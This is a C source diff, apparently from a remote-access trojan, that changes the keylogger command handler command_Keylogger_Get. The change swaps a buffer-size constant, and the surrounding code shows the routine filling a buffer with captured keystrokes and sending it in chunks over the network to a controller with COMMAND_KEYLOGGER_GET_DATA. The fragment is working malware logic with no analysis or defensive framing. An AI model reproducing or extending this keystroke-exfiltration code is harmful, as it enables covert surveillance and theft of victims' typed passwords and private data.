@@ -65,15 +65,15 @@ int command_Keylogger_Get(void)
 	
 	uint32 i;
 	uint32 bufferIndex = 0;
-	uint8 buffer[NET_BUFFSIE_FOR_FILE];
-	memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
+	uint8 buffer[NET_BUFFSIE_MAX_CONTENT];
+	memset(buffer, 0, NET_BUFFSIE_MAX_CONTENT);
 	uint8 *rmsg;
 
 	for(i = 0; i != size; i++)
 	{
-		if(bufferIndex >= NET_BUFFSIE_FOR_FILE)
+		if(bufferIndex >= NET_BUFFSIE_MAX_CONTENT)
 		{
-			if(net_SendCmd(buffer, NET_BUFFSIE_FOR_FILE, COMMAND_KEYLOGGER_GET_DATA) == NET_LOST_CONNECTION)
+			if(net_SendCmd(buffer, NET_BUFFSIE_MAX_CONTENT, COMMAND_KEYLOGGER_GET_DATA) == NET_LOST_CONNECTION)
 			{
 				free(data);
 
@@ -93,7 +93,7 @@ int command_Keylogger_Get(void)
 				return NET_LOST_CONNECTION;
 			}
 
-			memset(buffer, 0, NET_BUFFSIE_FOR_FILE);
+			memset(buffer, 0, NET_BUFFSIE_MAX_CONTENT);
 			bufferIndex = 0;
 			free(rmsg);
 		}
@@ -103,7 +103,7 @@ int command_Keylogger_Get(void)
 
 	free(data);
 
-	if(bufferIndex != 0 || bufferIndex <= NET_BUFFSIE_FOR_FILE)
+	if(bufferIndex != 0 || bufferIndex <= NET_BUFFSIE_MAX_CONTENT)
 	{	
 		if(net_SendCmd(buffer, bufferIndex, COMMAND_KEYLOGGER_GET_DATA) == NET_LOST_CONNECTION)
 		{
